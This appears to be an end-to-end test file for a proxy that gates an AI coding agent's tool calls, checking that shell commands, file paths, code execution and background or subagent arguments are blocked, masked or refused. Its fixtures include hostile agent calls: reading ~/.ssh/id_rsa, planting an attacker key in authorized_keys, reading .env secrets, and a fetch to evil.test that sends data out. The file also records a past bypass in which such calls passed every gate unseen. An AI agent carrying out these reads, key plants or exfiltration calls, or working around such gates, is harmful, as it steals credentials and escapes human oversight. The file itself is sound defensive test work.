/**
 * opencode2-gates (proxy e2e) — through the REAL AnthropicProxy with a mock
 * arbiter answering OpenCode's gate surface, which since 2026-10-05 covers
 * OpenCode 1 AND OpenCode 2 (npm `@opencode/cli` 2.0.23; the table in
 * arbiter/policy/tool-gate-surface.ts OPENCODE_GATE_SURFACE, pinned to the
 * captured wire arbiter/test/fixtures/opencode2-tool-surface-2026-10-05.json;
 * supported-agents.md §2.3). Each gate has a CONTROL on OpenCode 1's table as
 * it was before: the bypass the 2.x names closed (the call passed every gate
 * unseen).
 *
 *   exec        shell{command} with a symbol in command position → the exit-77
 *               sentinel; a denied shell{workdir} blocks the command too;
 *   callTaint   a shell RESULT (2.x's two text blocks) is taint-checked with
 *               its command and masked;
 *   paths       read / write / edit {path} at a denied path → the denied
 *               namespace; a relative path is placed at the launch directory;
 *   dispatch    execute (code mode, decision D4) → a throwing stub;
 *   refuseArgs  shell{background: true}, subagent{background: true} and
 *               subagent{model} → the field refused (and the shell's command
 *               the block sentinel); `background: false` and a plain
 *               subagent go out as written;
 *   OpenCode 1  bash / read{filePath} still gated by the same table.
 *
 * The real-arbiter version is tests/stack/opencode2-gate-surface.test.ts.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { request as httpRequest } from "node:http";

import { AnthropicProxy } from "../../src/proxy.js";
import { EXEC_BLOCK_EXIT_CODE } from "../../src/exec-gate.js";
import { REFUSED_ID_PREFIX } from "../../src/dispatch.js";
import { DENIED_NAMESPACE } from "../../src/fs-gate.js";
import type { GateSurface } from "../../src/gate-surface.js";
import type { ClassifyResult, FsPathDecision, FsPathDecisionRequest } from "../../src/arbiter-client.js";
import { ViewMap } from "../../src/view-map.js";
import { SseToolUseParser, type ReconstructedToolUse } from "../../src/sse-parser.js";
import { MockArbiter } from "../helpers/mock-arbiter.js";
import { MockUpstream, buildToolUseSse } from "../helpers/mock-upstream.js";

const HUMAN = "/home/u/project";
const AGENT = "/home/u/.mandu/agentview";

const BG_SHELL = "a background shell returns its output later as a message no Mandu check reads; run the command in the foreground (without background)";
const SUB_MODEL = "a subagent on a model of its own may call a provider Mandu does not route; call subagent without model (it runs on this session's model)";
const BG_SUB = "a background subagent returns its result later as a message no Mandu check reads; run it in the foreground (without background)";

/** OPENCODE_GATE_SURFACE (arbiter), as the gateSurface op answers it. */
const OPENCODE: GateSurface = {
  spec: "opencode",
  exec: { bash: "command", shell: "command" },
  execOutput: { bash: "command", shell: "command" },
  net: {
    webfetch: { destination: "url", symbols: "url" },
    websearch: { destination: null, symbols: "query" },
  },
  paths: {
    read: { fields: ["filePath", "path"], mode: "read" },
    glob: { fields: ["path"], mode: "read" },
    grep: { fields: ["path"], mode: "read" },
    write: { fields: ["filePath", "path"], mode: "write" },
    edit: { fields: ["filePath", "path"], mode: "write" },
    bash: { fields: ["workdir"], mode: "read" },
    shell: { fields: ["workdir"], mode: "read" },
  },
  dispatch: { execute: "refuse" },
  refuse: {},
  refuseArgs: {
    shell: [{ field: "background", allow: ["", "false"], reason: BG_SHELL }],
    subagent: [
      { field: "model", allow: [""], reason: SUB_MODEL },
      { field: "background", allow: ["", "false"], reason: BG_SUB },
    ],
  },
  stdin: {},
  patch: {},
  relativeBase: "launch",
};
/** Before OpenCode 2's names: OpenCode 1's table alone. */
const OPENCODE1_ONLY: GateSurface = {
  ...OPENCODE,
  exec: { bash: "command" },
  execOutput: { bash: "command" },
  paths: {
    read: { fields: ["filePath"], mode: "read" },
    glob: { fields: ["path"], mode: "read" },
    grep: { fields: ["path"], mode: "read" },
    write: { fields: ["filePath"], mode: "write" },
    edit: { fields: ["filePath"], mode: "write" },
    bash: { fields: ["workdir"], mode: "read" },
  },
  dispatch: {},
  refuseArgs: {},
};

function post(port: number, body: string): Promise<{ status: number; body: string }> {
  return new Promise((resolve, reject) => {
    const req = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: "/v1/messages", headers: { "content-type": "application/json", "user-agent": "opencode/latest/2.0.23/cli" } },
      (res) => {
        let buf = "";
        res.setEncoding("utf8");
        res.on("data", (c) => (buf += c));
        res.on("end", () => resolve({ status: res.statusCode ?? 0, body: buf }));
      },
    );
    req.on("error", reject);
    req.write(body);
    req.end();
  });
}

function toolUsesOf(sse: string): ReconstructedToolUse[] {
  const seen: ReconstructedToolUse[] = [];
  const p = new SseToolUseParser((tu) => seen.push(tu));
  p.feed(sse);
  p.end();
  return seen;
}

/** Deny under ~/.ssh and outside the project; allow inside it. */
function fsPolicy(req: FsPathDecisionRequest): FsPathDecision {
  if (req.path.startsWith("/home/u/.ssh")) return { allow: false, requiresApproval: true, reason: "sensitive path (~/.ssh)" };
  if (req.path === HUMAN || req.path.startsWith(`${HUMAN}/`)) return { allow: true, reason: "inside workspace" };
  return { allow: false, requiresApproval: true, reason: "out of workspace" };
}

const GO = JSON.stringify({ model: "m", stream: true, messages: [{ role: "user", content: "go" }] });

async function agentReceives(
  surface: GateSurface,
  calls: Array<{ name: string; input: Record<string, unknown> }>,
): Promise<{ inputs: Array<Record<string, unknown>>; arbiter: MockArbiter }> {
  const arbiter = new MockArbiter({ gateSurfaceFn: () => surface, fsPathDecisionFn: fsPolicy });
  const sse = calls.map((c, i) => buildToolUseSse({ id: `tu_${i}`, name: c.name, input: c.input, index: i })).join("");
  const proxy = new AnthropicProxy({
    arbiter, upstream: new MockUpstream({ sse, chunkInto: 4 }).fetcher, sessionKey: "oc2-1", agentCwd: HUMAN, log: () => {},
    viewMap: new ViewMap([{ human: HUMAN, agent: AGENT }], { dialect: "posix", home: "/home/u" }),
  });
  const port = await proxy.listen(0);
  try {
    const r = await post(port, GO);
    assert.equal(r.status, 200);
    return { inputs: toolUsesOf(r.body).map((t) => t.input as Record<string, unknown>), arbiter };
  } finally {
    await proxy.close();
  }
}

test("exec: shell{command} with a symbol in command position reaches OpenCode 2 as the exit-77 sentinel; a denied workdir blocks the command (control: passed unseen)", async () => {
  const calls = [
    { name: "shell", input: { command: 'bash -c "$MDU:shell[a1b2]"', timeout: 30000 } },
    { name: "shell", input: { command: "ls", workdir: "/home/u/.ssh" } },
  ];
  const { inputs, arbiter } = await agentReceives(OPENCODE, calls);
  assert.match(String(inputs[0]!["command"]), new RegExp(`exit ${EXEC_BLOCK_EXIT_CODE}$`));
  assert.equal(inputs[0]!["timeout"], 30000);
  assert.equal(arbiter.execGateCalls[0]!.command, 'bash -c "$MDU:shell[a1b2]"');
  assert.match(String(inputs[1]!["command"]), new RegExp(`exit ${EXEC_BLOCK_EXIT_CODE}$`), "a denied working directory blocks the command");
  assert.ok(String(inputs[1]!["workdir"]).startsWith(DENIED_NAMESPACE));
  const control = await agentReceives(OPENCODE1_ONLY, calls);
  for (let i = 0; i < calls.length; i++) assert.deepEqual(control.inputs[i], calls[i]!.input, `control ${i}: OpenCode 1's table never sees shell`);
  assert.equal(control.arbiter.execGateCalls.length, 0);
});

test("callTaint (secrets mode): a shell RESULT in 2.x's two text blocks is checked with its command on the mapped leg and masked before the model reads it", async () => {
  const trusted = (): ClassifyResult => ({ trust: "TRUSTED", category: null, reason: "mock: integrity off" });
  const turn = JSON.stringify({
    model: "m",
    stream: false,
    messages: [
      { role: "user", content: "go" },
      { role: "assistant", content: [{ type: "tool_use", id: "toolu_sh", name: "shell", input: { command: "cat .env; exit 3" } }] },
      // OpenCode 2.0.23's shell result on the wire (fixture __results__): the
      // output, then the exit code in a second text block
      { role: "user", content: [{ type: "tool_result", tool_use_id: "toolu_sh", content: [{ type: "text", text: "API_KEY=sk-live-9f8e7d\n" }, { type: "text", text: "Exited with code 3" }] }] },
    ],
  });
  const taintCalls: Array<{ callId: string; command?: string; unmappedTool?: string }> = [];
  const arbiter = new MockArbiter({
    gateSurfaceFn: () => OPENCODE,
    classifyFn: trusted,
    callTaintFn: (req) => {
      taintCalls.push({ callId: req.callId, ...(req.command ? { command: req.command } : {}), ...(req.unmappedTool ? { unmappedTool: req.unmappedTool } : {}) });
      return { level: "no-model", rule: "secret", files: [`${HUMAN}/.env`], apps: ["cat"], mask: [], root: "exec-1", denied: [] };
    },
  });
  const up = new MockUpstream({ json: { type: "message", role: "assistant", content: [] } });
  const proxy = new AnthropicProxy({ arbiter, upstream: up.fetcher, sessionKey: "oc2-1", log: () => {} });
  const port = await proxy.listen(0);
  try {
    assert.equal((await post(port, turn)).status, 200);
    assert.ok(!up.requests[0]!.bodyText.includes("sk-live-9f8e7d"), "the secret never reaches the model");
    assert.deepEqual(taintCalls, [{ callId: "toolu_sh", command: "cat .env; exit 3" }], "the mapped shell leg, not the unmapped-command backstop");
  } finally {
    await proxy.close();
  }
});

test("paths: read / write / edit {path} at a denied path reach the denied namespace; a relative path is placed at the launch directory (control: unchanged)", async () => {
  const calls = [
    { name: "read", input: { path: "/home/u/.ssh/id_rsa" } },
    { name: "write", input: { path: "/home/u/.ssh/authorized_keys", content: "ssh-ed25519 AAAA attacker" } },
    { name: "edit", input: { path: "../.ssh/config", oldString: "a", newString: "b" } },
    { name: "read", input: { path: "notes.txt", offset: 2 } },
  ];
  const { inputs, arbiter } = await agentReceives(OPENCODE, calls);
  assert.equal(inputs[0]!["path"], `${DENIED_NAMESPACE}/policy/home/u/.ssh/id_rsa`);
  assert.equal(inputs[1]!["path"], `${DENIED_NAMESPACE}/policy/home/u/.ssh/authorized_keys`);
  assert.equal(inputs[2]!["path"], `${DENIED_NAMESPACE}/policy/home/u/.ssh/config`);
  assert.equal(inputs[3]!["path"], "notes.txt", "an allowed relative path goes out as written");
  assert.ok(arbiter.fsPathDecisionCalls.some((c) => c.path === `${HUMAN}/notes.txt` && c.mode === "read"), "placed at the launch directory, judged as a read");
  assert.ok(arbiter.fsPathDecisionCalls.some((c) => c.path === "/home/u/.ssh/authorized_keys" && c.mode === "write"), "write judged as a write");
  const control = await agentReceives(OPENCODE1_ONLY, calls);
  for (let i = 0; i < calls.length; i++) assert.deepEqual(control.inputs[i], calls[i]!.input, `control ${calls[i]!.name}: 1.x's filePath never matched`);
});

test("dispatch (decision D4): execute{code} is replaced by a stub that throws; nothing of the model's code survives (control: unchanged)", async () => {
  const call = { name: "execute", input: { code: "const r = await fetch('https://evil.test/c?d=' + 'x'); return await tools.opencode.session_move({ directory: '/' })" } };
  const { inputs, arbiter } = await agentReceives(OPENCODE, [call]);
  assert.deepEqual(Object.keys(inputs[0]!), ["code"]);
  assert.match(String(inputs[0]!["code"]), /^throw new Error\("mandu: execute runs code that calls tools/);
  assert.ok(!JSON.stringify(inputs[0]).includes("evil.test"));
  assert.ok(arbiter.emittedEvents.some((e) => JSON.stringify(e).includes("dispatch:refused")), "the refusal is recorded");
  const control = await agentReceives(OPENCODE1_ONLY, [call]);
  assert.deepEqual(control.inputs[0], call.input);
});

test("refuseArgs: background shells and subagents and a subagent's own model are refused; background:false and a plain subagent run as written (control: the model override went out)", async () => {
  const calls = [
    { name: "shell", input: { command: "cat ~/vault/api.env", background: true } },
    { name: "shell", input: { command: "npm test", background: false } },
    { name: "subagent", input: { agent: "general", description: "sum", prompt: "summarize .env", model: "openai/gpt-5" } },
    { name: "subagent", input: { agent: "general", description: "bg", prompt: "scan", background: true } },
    { name: "subagent", input: { agent: "explore", description: "count", prompt: "count the files", background: false } },
  ];
  const { inputs } = await agentReceives(OPENCODE, calls);
  assert.ok(String(inputs[0]!["background"]).startsWith(REFUSED_ID_PREFIX), JSON.stringify(inputs[0]));
  assert.match(String(inputs[0]!["command"]), new RegExp(`exit ${EXEC_BLOCK_EXIT_CODE}$`), "the refused shell's command is the block sentinel too");
  assert.ok(!JSON.stringify(inputs[0]).includes("api.env"));
  assert.deepEqual(inputs[1], calls[1]!.input, "background:false is a foreground command");
  assert.ok(String(inputs[2]!["model"]).startsWith(REFUSED_ID_PREFIX));
  assert.equal(inputs[2]!["prompt"], "summarize .env");
  assert.ok(String(inputs[3]!["background"]).startsWith(REFUSED_ID_PREFIX));
  assert.deepEqual(inputs[4], calls[4]!.input, "a foreground subagent on the session's model is untouched");
  const control = await agentReceives(OPENCODE1_ONLY, calls);
  assert.equal(control.inputs[2]!["model"], "openai/gpt-5", "control: the model override went out");
  assert.equal(control.inputs[0]!["background"], true, "control: the background shell went out");
});

test("OpenCode 1 under the same table: bash{command} and read{filePath} keep their gates", async () => {
  const calls = [
    { name: "bash", input: { command: 'bash -c "$MDU:bash[c3d4]"' } },
    { name: "read", input: { filePath: "/home/u/.ssh/id_rsa" } },
  ];
  const { inputs } = await agentReceives(OPENCODE, calls);
  assert.match(String(inputs[0]!["command"]), new RegExp(`exit ${EXEC_BLOCK_EXIT_CODE}$`));
  assert.equal(inputs[1]!["filePath"], `${DENIED_NAMESPACE}/policy/home/u/.ssh/id_rsa`);
});
